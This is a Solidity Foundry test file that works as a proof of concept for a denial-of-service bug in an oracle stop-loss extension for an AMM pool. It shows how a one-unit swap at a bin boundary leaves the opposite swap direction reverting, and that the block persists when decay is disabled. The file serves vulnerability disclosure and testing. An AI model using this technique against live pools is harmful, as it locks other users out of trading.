// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {MetricOmmPoolBaseTest, Q64} from "@metric-core-test/MetricOmmPool.base.t.sol";
import {BinState} from "@metric-core/types/PoolStorage.sol";
import {ExtensionOrders} from "@metric-core/types/PoolExtensionsConfig.sol";
import {ExtensionOrderTestLib} from "@metric-core-test/ExtensionOrderTestLib.sol";
import {IOracleValueStopLossExtension} from "../../contracts/interfaces/extensions/IOracleValueStopLossExtension.sol";
import {OracleValueStopLossExtension} from "../../contracts/extensions/OracleValueStopLossExtension.sol";

contract OracleValueStopLossBoundaryDoSPoCTest is MetricOmmPoolBaseTest {
  uint32 private constant DRAWDOWN_E6 = 50_000; // 5%
  uint32 private constant DECAY_DISABLED = 0;
  uint104 private constant SHARES_PER_BIN = 100_000;

  OracleValueStopLossExtension internal stopLoss;

  function setUp() public override {
    super.setUp();

    stopLoss = new OracleValueStopLossExtension(address(this));
    _deployPoolWithStopLoss();
    _approveUsersForPool(address(pool));

    stopLoss.initialize(address(pool), abi.encode(DRAWDOWN_E6, DECAY_DISABLED, uint32(0)));
  }

  function test_permissionlessBoundarySwapCreatesOneWayDoS() public {
    _seedTwoUpperBinsAndPrimeBoundaryWatermark();

    (uint104 bin1Token0Before, uint104 bin1Token1Before,,,) = _getBinState(1);
    assertEq(bin1Token0Before, SHARES_PER_BIN, "bin 1 should still contain its initial token0");
    assertEq(bin1Token1Before, 0, "bin 1 was only boundary-included, not traded through");

    oracle.setBidAndAskPrice(uint128(Q64 / 2), uint128(Q64 / 2 + 1));

    // The attacker uses the direction that is not blocked by the bin-1 token1-metric breach.
    // This crosses from bin 1 at position 0 into bin 0 at position max without consuming bin 0.
    _swap(0, users[0], true, _i128ExactIn(1), 0);

    assertEq(_getCurBinIdx(), 0, "cursor moved into the previous bin");
    assertEq(_getCurPosInBin(), type(uint104).max, "cursor is parked at the bin-0 upper boundary");

    (uint104 bin1Token0After, uint104 bin1Token1After,,,) = _getBinState(1);
    assertEq(bin1Token0After, bin1Token0Before, "boundary bin token0 was not consumed");
    assertEq(bin1Token1After, bin1Token1Before, "boundary bin token1 was not consumed");

    // A normal user trying to swap in the opposite direction now has to cross bin 1. The
    // extension checks bin 1 inclusively and reverts even though the attacker did not trade it.
    vm.expectPartialRevert(IOracleValueStopLossExtension.OracleStopLossTriggered.selector);
    _swap(2, users[2], false, _i128ExactIn(1_000), type(uint128).max);
  }

  function test_zeroDecayKeepsBlockedDirectionClosedAfterLongTime() public {
    test_permissionlessBoundarySwapCreatesOneWayDoS();

    vm.warp(block.timestamp + 30 days);

    vm.expectPartialRevert(IOracleValueStopLossExtension.OracleStopLossTriggered.selector);
    _swap(3, users[3], false, _i128ExactIn(1_000), type(uint128).max);
  }

  function _deployPoolWithStopLoss() internal {
    (BinState[] memory nn, BinState[] memory neg) = _defaultBinStateArrays();
    pool = _deployPoolAndRegister(
      PoolDeployParams({
        priceProvider: address(oracle),
        extensions: _singleExtensionPoolExtensions(address(stopLoss)),
        extensionOrders: _afterSwapStopLossOrder(),
        immutablePriceProvider: true,
        protocolSpreadFeeE6: 0,
        adminSpreadFeeE6: 0,
        curBinDistFromProvidedPriceE6: 0,
        nonNegativeBinStates: nn,
        negativeBinStates: neg,
        protocolNotionalFeeE8: 0,
        adminNotionalFeeE8: 0,
        immutablePriceProviderForRegistry: address(oracle),
        lowestBin: -1,
        highestBin: 0
      })
    );
  }

  function _afterSwapStopLossOrder() internal pure returns (ExtensionOrders memory orders) {
    orders.afterSwap = ExtensionOrderTestLib.encodeExtensionOrder(1, 0, 0, 0, 0, 0, 0);
  }

  function _seedTwoUpperBinsAndPrimeBoundaryWatermark() internal {
    _addLiquidity(1, 0, 1, SHARES_PER_BIN, 0);

    (uint104 bin0Token0Before,,,,) = _getBinState(0);
    assertEq(bin0Token0Before, SHARES_PER_BIN, "bin 0 seeded with token0");

    // This normal swap consumes bin 0 and advances the cursor to bin 1 at position 0.
    // The stop-loss extension records bin 1's high watermark because it checks [0, 1].
    _swap(0, users[0], false, _i128ExactOut(bin0Token0Before), type(uint128).max);

    assertEq(_getCurBinIdx(), 1, "cursor should be at bin 1 after consuming bin 0");
    assertEq(_getCurPosInBin(), 0, "cursor should be at the lower boundary of bin 1");

    (, uint256 bin1Hwm1) = stopLoss.currentHighWatermarks(address(pool), 1);
    assertGt(bin1Hwm1, 0, "boundary-included bin 1 received a token1 high watermark");
  }
}
